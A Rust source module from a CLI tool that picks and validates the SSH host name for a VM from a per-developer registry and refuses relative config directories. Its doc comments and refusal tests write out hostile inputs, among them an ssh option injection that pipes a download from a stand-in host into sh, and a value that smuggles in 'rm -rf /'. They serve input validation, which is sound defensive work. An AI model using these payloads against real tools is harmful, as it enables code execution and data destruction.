//! Where the VM host name comes from, and what shape it may take.
//!
//! Two keys in the operator's registry can name it: the project
//! entry's own `host`, and the file-wide one below it. The entry
//! wins, so one project can run on a machine of its own. An
//! operator writes `host` inside a project's table for exactly
//! that.
//!
//! `super::registry` reads the file; [`rank`] picks between the
//! two keys in a copy it is handed, and builds the winner into a
//! [`HostName`]. Both keys have already been checked by then:
//! `super::registry`'s parse applies [`refuse_if_bad`] to every
//! `host` in the file as it reads it, whether or not the run
//! turns out to want that one, and its header says why. So
//! holding a `Registry` is the proof that every host in it
//! passed.
//!
//! What a host value may be is decided in one place,
//! [`HostName::parse`], so the message an operator gets does not
//! depend on which key carried the value.
//!
//! # Why the config directory is decided here
//!
//! [`user_config_dir`] answers where the registry file lives,
//! and it sits in this module because the host is what the
//! answer protects: a relative `BOMBYX_CONFIG_HOME` would take
//! the VM host out of whatever repository bombyx was run in,
//! which is the one thing this design removes.

use std::fmt;
use std::path::{Path, PathBuf};

use super::error::FieldError;
use super::registry::{self, USER_CONFIG_FILE};
use super::{ConfigError, guards};
use crate::name::ProjectName;

/// Characters allowed in an SSH destination.
///
/// Deliberately narrow: an alias from `~/.ssh/config`, or a
/// `user@host` spelling.
pub(crate) fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@')
}

/// Environment variable relocating the per-developer config
/// directory.
///
/// Exists so a test -- or an operator keeping several setups
/// apart -- can point bombyx at a directory of its own instead
/// of the real one.
pub const CONFIG_DIR_ENV: &str = "BOMBYX_CONFIG_HOME";

/// The machine bombyx runs `vagrant` on, as an SSH destination.
///
/// This is a *newtype*: a struct wrapping one `String`, where
/// the `String` inside is private. You cannot build one
/// directly. You have to call [`HostName::parse`], which applies
/// the three rules first. So holding a `HostName` is the proof
/// that they ran.
///
/// The field it fills, `super::Config::host`, is public, so a
/// checking function would leave every assignment to that field
/// free to skip it. The value becomes `ssh`'s first positional
/// argument, and `ssh` honours no `--`, so one starting with
/// `-` is an option rather than a destination.
///
/// **There is deliberately no `#[serde(try_from = "String")]`**,
/// unlike [`super::RemoteRoot`] and [`super::RepoUrl`]. The
/// registry has a `host` key per project and one more below them
/// all, so the field name `host` names none of them. `checked`
/// takes a [`HostOrigin`] and says which line to edit instead,
/// and serde cannot supply one because it does not know which
/// key it is reading. `super::registry`'s parse applies the rule
/// to every `host` in the file, and `rank` builds the winner.
/// (Neither is linked: both are private, and rustdoc refuses a
/// public page pointing at a private item.)
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HostName(String);

impl HostName {
    /// Applies the three rules to `raw` and wraps it.
    ///
    /// All three come from `super::guards`, so widening one
    /// there widens it here too.
    ///
    /// The leading-dash rule is the one worth spelling out.
    /// `host` reaches `ssh` as its first positional argument,
    /// and `ssh` does not honour a `--` end-of-options
    /// separator, so a leading `-` is read as an option:
    /// `-oProxyCommand=curl evil|sh` runs code on this
    /// workstation from a bare `bombyx status`, before any
    /// network traffic.
    ///
    /// # Errors
    ///
    /// Returns [`FieldError::Empty`] when `raw` is blank, and
    /// [`FieldError::Invalid`] when it starts with `-` or holds
    /// a character outside the allowed set: letters, digits,
    /// `.`, `_`, `-` and `@`.
    pub fn parse(raw: &str) -> Result<Self, FieldError> {
        guards::check_not_empty("host", raw)?;
        guards::check_not_an_option("host", raw, "ssh")?;
        guards::check_charset(
            "host",
            raw,
            is_host_char,
            "letters, digits, `.`, `_`, `-` or `@`",
        )?;
        Ok(Self(raw.to_owned()))
    }

    /// The value, as `ssh` sees it.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for HostName {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

impl AsRef<str> for HostName {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

/// Builds a [`HostName`] from `value`, naming its source rather
/// than a field when it is refused.
///
/// [`FieldError`] carries a field name, and for every other
/// config value that name answers the operator's question,
/// "which key do I edit?". For `host` it does not: the registry
/// has a `host` key per project and one more below them all, so
/// `host` identifies none of them. The useful answer is the
/// source, which the caller supplies as a [`HostOrigin`], so
/// the name is dropped here and the origin put in its place.
///
/// [`FieldError::Empty`] carries only a field name and no
/// reason, so a fixed sentence stands in for one.
///
/// # Errors
///
/// Returns [`ConfigError::InvalidHost`], naming the source and
/// the reason.
pub(crate) fn checked(
    value: &str,
    origin: &HostOrigin,
    path: Option<&Path>,
) -> Result<HostName, ConfigError> {
    HostName::parse(value).map_err(|err| ConfigError::InvalidHost {
        origin: origin.describe(path),
        reason: match err {
            FieldError::Empty { .. } => "must not be empty".to_owned(),
            FieldError::Invalid { reason, .. } => reason,
        },
    })
}

/// Refuses `value` if it is not a legal host, throwing the
/// [`HostName`] away.
///
/// `super::registry`'s parse checks every `host` in the file,
/// including the ones no run will want, and has nowhere to keep
/// them: an entry's `host` stays in the entry as the table
/// spelled it, and [`rank`] builds the winner later.
///
/// # Errors
///
/// Whatever [`checked`] returns.
pub(crate) fn refuse_if_bad(
    value: &str,
    origin: &HostOrigin,
    path: Option<&Path>,
) -> Result<(), ConfigError> {
    checked(value, origin, path).map(|_| ())
}

/// Whether an environment-supplied directory is safe to use.
///
/// Requires an anchored path: a POSIX root, a Windows root, or a
/// drive *with* a separator. Rooted spellings are checked
/// directly rather than through [`Path::is_absolute`], which
/// answers per-platform -- `C:\x` is not absolute on Unix and
/// `/x` is not absolute on Windows, while this same code reads
/// the same environment on both.
///
/// `C:cfg` is refused along with `cfg`: a drive-relative path
/// resolves against that drive's current directory, which is not
/// a location the operator chose either.
pub fn is_anchored_dir(value: &str) -> bool {
    let value = value.trim();
    if value.starts_with('/') || value.starts_with('\\') {
        return true;
    }
    let bytes = value.as_bytes();
    bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'/' || bytes[2] == b'\\')
}

/// Returns the directory holding the per-developer config.
///
/// [`CONFIG_DIR_ENV`] wins when set. Otherwise this is
/// `%APPDATA%\bombyx` on Windows and
/// `$XDG_CONFIG_HOME/bombyx` -- or `$HOME/.config/bombyx` --
/// elsewhere. `None` when the environment names no home at
/// all, which is a machine bombyx cannot guess about.
///
/// Every value must be an *anchored* path; a blank or relative
/// one counts as unset and the next source is consulted. A
/// relative value would otherwise resolve against the working
/// directory, which on this tool means taking the VM host out of
/// whatever repo bombyx was run in.
#[must_use]
pub fn user_config_dir() -> Option<PathBuf> {
    config_dir_from(|key| std::env::var(key).ok(), cfg!(windows))
}

/// [`user_config_dir`] against an arbitrary environment.
///
/// `var` is split out so the precedence is testable without
/// mutating the process environment, which is global and would
/// make these tests race each other. `windows` is split out for
/// the same reason and gates `APPDATA`.
///
/// **`APPDATA` is consulted only when `windows`.** It is
/// routinely set in processes that are not Windows -- under WSL
/// via `WSLENV`, under Wine, in some CI images. Checking it
/// unconditionally would make a Linux run read a *Windows*
/// config directory in preference to `$HOME/.config`, silently
/// taking the host name from a file the docs say applies only to
/// Windows.
pub(crate) fn config_dir_from<F>(var: F, windows: bool) -> Option<PathBuf>
where
    F: Fn(&str) -> Option<String>,
{
    // A value that is blank *or not anchored* is treated as
    // unset, and the next source is consulted.
    //
    // Both spellings do the same damage. Set to "" by a launcher
    // script, the variable resolves to a relative
    // `bombyx/config.toml` in the working directory; set to a
    // non-blank relative value it resolves just as relatively --
    // `BOMBYX_CONFIG_HOME=.` reads `./config.toml`,
    // `XDG_CONFIG_HOME=.config` reads
    // `./.config/bombyx/config.toml`, and `..` walks out of the
    // tree. Either way the host name comes out of the repo,
    // which is the one thing this design removes.
    //
    // Such a value arrives from a per-directory environment
    // (`direnv`, a `mise.toml` in a clone, a CI job) or a plain
    // typo, and the host it supplies decides where `up` boots a
    // VM and where `destroy` runs `rm -rf`.
    let set = |key: &str| {
        var(key)
            .filter(|v| is_anchored_dir(v))
            .map(|v| v.trim().to_owned())
    };

    if let Some(dir) = set(CONFIG_DIR_ENV) {
        return Some(PathBuf::from(dir));
    }
    if windows {
        return set("APPDATA")
            .map(|appdata| Path::new(&appdata).join("bombyx"));
    }
    if let Some(xdg) = set("XDG_CONFIG_HOME") {
        return Some(Path::new(&xdg).join("bombyx"));
    }
    let home = set("HOME")?;
    Some(Path::new(&home).join(".config").join("bombyx"))
}

/// Which key supplied [`super::Config::host`].
///
/// Returned by [`super::Config::load_project`], so a caller can
/// *report* the winner instead of re-deriving it. A binary that
/// re-read the registry for itself would hold a second copy of
/// the precedence rule below, in code no library test can reach
/// -- so swapping the two keys here would leave its message
/// naming the wrong one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HostOrigin {
    /// One project's entry in the per-developer
    /// [`USER_CONFIG_FILE`].
    ///
    /// It carries the project name because the entry and the
    /// file-wide `host` sit in the same file: naming the file
    /// alone would leave the operator to work out which of the
    /// two won, and `destroy` runs `rm -rf` on the winner. The
    /// name is the map key as the file spells it, so it is the
    /// table heading to go and edit.
    ///
    /// Carrying it is why [`HostOrigin`] is not `Copy`.
    ProjectEntry(ProjectName),
    /// The file-wide `host` in the per-developer
    /// [`USER_CONFIG_FILE`].
    UserFile,
}

impl HostOrigin {
    /// Names this source, in the words every message and the
    /// startup notice print.
    ///
    /// `path` is the registry file, and every caller with one
    /// passes it: the operator is being sent to that file to fix
    /// or check a value, and `--config` means the name alone
    /// does not identify it.
    ///
    /// `None` renders the bare [`USER_CONFIG_FILE`], for a
    /// caller that has no path at all.
    ///
    /// **There is deliberately no `Display` impl.** `--config`
    /// means the winning key can sit at any path, so no default
    /// rendering can be right; requiring the argument makes the
    /// caller answer rather than guess.
    ///
    /// One function rather than two, so the notice and the error
    /// cannot come to describe the same source differently. The
    /// wording for a project entry names its table, and that
    /// spelling existing twice is how the two drift apart.
    pub fn describe(&self, path: Option<&Path>) -> String {
        let file = path.map_or_else(
            || USER_CONFIG_FILE.to_owned(),
            super::read::path_display,
        );
        let file = file.as_str();
        match self {
            Self::ProjectEntry(name) => {
                // `.host` sits outside the brackets, so the
                // heading and the key are separate here.
                let table = registry::heading(name.as_str(), "");
                format!("{table}.host in {file}")
            }
            Self::UserFile => file.to_owned(),
        }
    }
}

/// Picks between the two `host` keys the registry can carry.
///
/// The project entry's own `host` wins; the file-wide `host`
/// applies when the entry has none. One machine name written
/// once covers every project, and a project that runs elsewhere
/// says so in its own table.
///
/// `registry` is the file, already read. It is a parameter
/// rather than something this function opens because
/// `super::Config::load_project` needs the same file for the
/// project's other settings, and it must be the same *copy*: a
/// file edited between two reads could supply a project host and
/// a file-wide host that never coexisted.
///
/// This is where the winner becomes a [`HostName`]. Both values
/// arrive checked -- `super::registry`'s parse is what checked
/// them -- so [`refuse_if_bad`] here is the second of two
/// passes and cannot fail today. It runs anyway, because this
/// function would otherwise depend on a rule applied in another
/// module, and a `Registry` built some future way would hand an
/// unchecked name straight to `ssh`.
///
/// # Errors
///
/// Returns [`ConfigError::HostMissing`] when neither key names a
/// host, and [`ConfigError::InvalidHost`] if a value reaches
/// here that `super::registry`'s parse did not refuse.
pub(crate) fn rank(
    registry: &registry::Registry,
    name: &str,
) -> Result<(HostName, HostOrigin), ConfigError> {
    let path = Some(registry.path());
    if let Some((key, host)) = registry.project_host(name) {
        let origin = HostOrigin::ProjectEntry(key.clone());
        return Ok((checked(host, &origin, path)?, origin));
    }
    if let Some(host) = registry.host() {
        let origin = HostOrigin::UserFile;
        return Ok((checked(host, &origin, path)?, origin));
    }
    Err(ConfigError::HostMissing {
        place: super::read::path_display(registry.path()),
    })
}

/// The registry file bombyx reads when `--config` names none.
///
/// [`user_config_dir`] decides the directory and
/// [`USER_CONFIG_FILE`] is the name inside it. `None` when the
/// environment names no config directory, which is a machine
/// bombyx cannot guess about.
#[must_use]
pub fn registry_file() -> Option<PathBuf> {
    user_config_dir().map(|dir| dir.join(USER_CONFIG_FILE))
}

/// Names the registry file, for an error message.
///
/// [`ConfigError::RegistryNotFound`] is what needs it, and it is
/// the one message about a file bombyx did not open. Every other
/// message asks the `Registry` for the path it was read from.
///
/// It is a path the operator can act on, so it is printed in
/// full rather than described. Only a machine whose environment
/// names no config directory at all gets the description, and
/// then there is no path to print.
pub(crate) fn registry_place(path: Option<&Path>) -> String {
    path.map_or_else(
        // No config directory in the environment, so there is
        // nothing concrete to point at.
        || format!("a {USER_CONFIG_FILE} in your config directory"),
        super::read::path_display,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_whole_family_of_bad_hosts_is_refused() {
        // The registry tests apply the same table through the
        // file, which is the seam. This applies it to the
        // constructor, which is the type's own promise: a
        // `HostName` that exists is one that passed.
        //
        // `-oProxyCommand=...` is the case that matters most.
        // `ssh` honours no `--`, so this reaches it as an option
        // naming a program to run, from a bare `bombyx status`.
        for (bad, reason) in [
            ("", "must not be empty"),
            ("   ", "must not be empty"),
            ("-oProxyCommand=curl evil|sh", "must not start with"),
            ("vm host", "letters, digits"),
            ("vmhost; rm -rf /", "letters, digits"),
            ("vmhost\n", "letters, digits"),
        ] {
            let err = HostName::parse(bad).expect_err("must be refused");
            assert!(
                err.to_string().contains(reason),
                "{bad:?}: want {reason:?}, got {err}"
            );
        }
    }

    #[test]
    fn the_spellings_operators_write_are_kept() {
        // An alias out of `~/.ssh/config`, and the `user@host`
        // form for a machine with no entry there.
        for good in ["vmhost", "vm-host.local", "dev@192.0.2.7", "a_b"] {
            let host = HostName::parse(good)
                .unwrap_or_else(|e| panic!("{good:?}: {e}"));
            assert_eq!(host.as_str(), good);
            assert_eq!(host.to_string(), good);
            assert_eq!(host.as_ref(), good);
        }
    }
}
